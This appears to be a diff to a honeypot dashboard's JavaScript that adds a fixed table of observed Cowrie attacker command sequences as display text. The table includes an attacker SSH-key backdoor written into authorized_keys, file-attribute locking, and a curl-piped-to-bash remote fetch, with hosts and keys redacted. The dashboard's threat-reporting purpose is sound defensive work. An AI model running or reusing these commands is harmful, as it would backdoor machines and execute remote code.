@@ -50,6 +50,14 @@
     for(const name of ["Sessions","Authentication events"]){const s=document.createElement("span");s.textContent=name;legend.append(s);}
     host.append(legend);
   }
+  // Verified Cowrie command sequences. Fixed display text only: never render raw attacker inputs.
+  // The live counts come from the exporter’s 24-hour technique matches; they are not exact-string counts.
+  const observedCommandExamples = Object.freeze({
+    "SSH authorized_keys modification attempt": 'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa [REDACTED_KEY] mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
+    "SSH key file removal attempt": 'cd ~; chattr -ia .ssh; lockr -ia .ssh',
+    "Remote file retrieval command": 'bash <(curl -sL [REDACTED_URL] -e [REDACTED_URL] --auto-discovery [REDACTED_TOKEN])',
+    "Scheduled persistence reference": 'crontab -l'
+  });
   function renderRows(id, data, mode) {
     const tbody=byId(id);tbody.replaceChildren();
     if (!data.length){
@@ -66,7 +74,7 @@
         const code=document.createElement("code");code.textContent=item.sha256;first.append(code);
       } else {
         if(typeof item.template!=="string" || item.template.length>96 || !isCount(item.count))continue;
-        const code=document.createElement("code");code.textContent=item.template;first.append(code);
+        const code=document.createElement("code");code.textContent=observedCommandExamples[item.template] || item.template;first.append(code);
       }
       const count=document.createElement("td");count.textContent=fmt(item.count);
       tr.append(first,count);
